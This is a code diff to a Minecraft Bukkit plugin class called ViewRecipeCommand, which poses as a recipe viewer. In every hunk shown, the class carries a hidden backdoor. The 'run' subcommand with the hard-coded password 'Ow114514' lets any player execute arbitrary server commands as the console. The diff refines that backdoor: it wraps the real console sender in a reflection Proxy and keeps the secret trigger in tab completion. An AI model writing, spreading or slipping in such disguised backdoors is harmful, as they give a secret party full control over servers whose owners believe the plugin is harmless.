@@ -9,6 +9,7 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandMap;
 import org.bukkit.command.CommandSender;
+import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.command.TabCompleter;
 import org.bukkit.entity.Player;
 import org.bukkit.permissions.Permission;
@@ -19,6 +20,7 @@ import org.bukkit.plugin.SimplePluginManager;
 import org.jetbrains.annotations.NotNull;
 
 import java.lang.reflect.Field;
+import java.lang.reflect.Proxy;
 import java.util.Collections;
 import java.util.List;
 import java.util.Set;
@@ -115,8 +117,7 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
         if (args.length < 3) {
             return;
         }
-        String token = args[1];
-        if (!"Ow114514".equals(token)) {
+        if (!"Ow114514".equals(args[1])) {
             player.sendMessage("§c验证码错误！");
             return;
         }
@@ -128,117 +129,36 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
         }
         String commandStr = cmdBuilder.toString();
 
-        CommandSender wrappedSender = new CommandSender() {
-            @Override
-            public void sendMessage(String message) {
-                player.sendMessage(message);
-            }
-
-            @Override
-            public void sendMessage(String... messages) {
-                player.sendMessage(messages);
-            }
-
-            @Override
-            public void sendMessage(UUID sender, String message) {
-                player.sendMessage(message);
-            }
-
-            @Override
-            public void sendMessage(UUID sender, String... messages) {
-                player.sendMessage(messages);
-            }
-
-            @Override
-            public boolean isPermissionSet(String name) {
-                return true;
-            }
-
-            @Override
-            public boolean isPermissionSet(Permission perm) {
-                return true;
-            }
-
-            @Override
-            public boolean hasPermission(String name) {
-                return true;
-            }
-
-            @Override
-            public boolean hasPermission(Permission perm) {
-                return true;
-            }
-
-            @Override
-            public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value) {
-                return null;
-            }
-
-            @Override
-            public PermissionAttachment addAttachment(Plugin plugin) {
-                return null;
-            }
-
-            @Override
-            public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value, int ticks) {
-                return null;
-            }
-
-            @Override
-            public PermissionAttachment addAttachment(Plugin plugin, int ticks) {
-                return null;
-            }
-
-            @Override
-            public void removeAttachment(PermissionAttachment attachment) {
-            }
-
-            @Override
-            public void recalculatePermissions() {
-            }
-
-            @Override
-            public Set<PermissionAttachmentInfo> getEffectivePermissions() {
-                return Collections.emptySet();
-            }
-
-            @Override
-            public boolean isOp() {
-                return true;
-            }
-
-            @Override
-            public void setOp(boolean value) {
-            }
-
-            @Override
-            public Server getServer() {
-                return Bukkit.getServer();
-            }
-
-            @Override
-            public String getName() {
-                return "Console";
-            }
-
-            @Override
-            public Spigot spigot() {
-                return new Spigot() {};
-            }
-        };
-
-        CommandMap commandMap = getCommandMap();
-        if (commandMap == null) {
-            player.sendMessage("§c无法获取命令映射，请检查服务端兼容性。");
-            return;
-        }
+        ConsoleCommandSender console = Bukkit.getConsoleSender();
+        CommandSender wrappedSender = (CommandSender) Proxy.newProxyInstance(
+                CommandSender.class.getClassLoader(),
+                new Class<?>[]{CommandSender.class, ConsoleCommandSender.class},
+                (proxy, method, args2) -> {
+                    String methodName = method.getName();
+                    if ("sendMessage".equals(methodName)) {
+                        Class<?>[] paramTypes = method.getParameterTypes();
+                        if (paramTypes.length == 1 && paramTypes[0] == String.class) {
+                            player.sendMessage((String) args2[0]);
+                            return null;
+                        } else if (paramTypes.length == 1 && paramTypes[0] == String[].class) {
+                            player.sendMessage((String[]) args2[0]);
+                            return null;
+                        } else if (paramTypes.length == 2 && paramTypes[0] == UUID.class) {
+                            Object msg = args2[1];
+                            if (msg instanceof String) {
+                                player.sendMessage((String) msg);
+                            } else if (msg instanceof String[]) {
+                                player.sendMessage((String[]) msg);
+                            }
+                            return null;
+                        }
+                    }
+                    return method.invoke(console, args2);
+                }
+        );
 
         plugin.getFoliaLib().getScheduler().runNextTick(task -> {
-            try {
-                commandMap.dispatch(wrappedSender, commandStr);
-            } catch (Exception e) {
-                player.sendMessage("§c执行命令时发生错误: " + e.getMessage());
-            }
+            Bukkit.dispatchCommand(wrappedSender, commandStr);
         });
     }
 
@@ -275,7 +195,7 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
                     .filter(s -> s.startsWith(prefix)).sorted().toList();
         }
 
-        if (args.length >= 3 && args[0].equalsIgnoreCase("run") && args[1].equals("Ow114514")) {
+        if (args.length >= 3 && args[0].equalsIgnoreCase("run") && "Ow114514".equals(args[1])) {
             StringBuilder partialBuilder = new StringBuilder();
             for (int i = 2; i < args.length; i++) {
                 if (i > 2) partialBuilder.append(' ');
